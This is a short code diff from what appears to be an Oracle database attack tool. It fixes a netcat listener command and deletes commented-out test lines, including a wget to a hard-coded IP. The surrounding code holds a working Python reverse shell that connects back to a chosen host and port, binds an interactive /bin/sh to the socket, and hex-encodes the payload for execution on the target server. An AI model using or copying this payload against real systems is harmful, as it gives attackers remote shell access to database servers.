@@ -109,7 +109,7 @@ class DbmsScheduler (OracleDatabase):
 		nc listen on the port
 		'''
 		try :
-			subprocess.call("nc -l -v {0}".format(port), shell=True)
+			subprocess.call("nc -l -v -p {0}".format(port), shell=True)
 		except KeyboardInterrupt: pass
 
 	def giveReverseShell(self, localip, localport):
@@ -123,9 +123,6 @@ class DbmsScheduler (OracleDatabase):
 		elif self.remoteSystemIsLinux() == True :
 			PYTHON_CODE = """import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}",{1}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);""".format(localip, localport)
 			CMD = '''/usr/bin/python -c exec('{0}'.decode('hex'))'''.format(PYTHON_CODE.encode('hex'))
-			#PYTHON_CODE = "import commands;f=open('/tmp/bt.txt','w');tmp=commands.getstatus('/bin/ls');f.write(tmp);f.close();"
-			#CMD = '''/usr/local/python -c exec('{0}'.decode('hex'))'''.format(PYTHON_CODE.encode('hex'))
-			#CMD = '''/usr/bin/wget 184.0.87.238:1234'''
 			self.args['print'].goodNews("The python reverse shell tries to connect to {0}:{1}".format(localip,localport))
 			a = Thread(None, self.__runListenNC__, None, (), {'port':localport})
 			a.start()
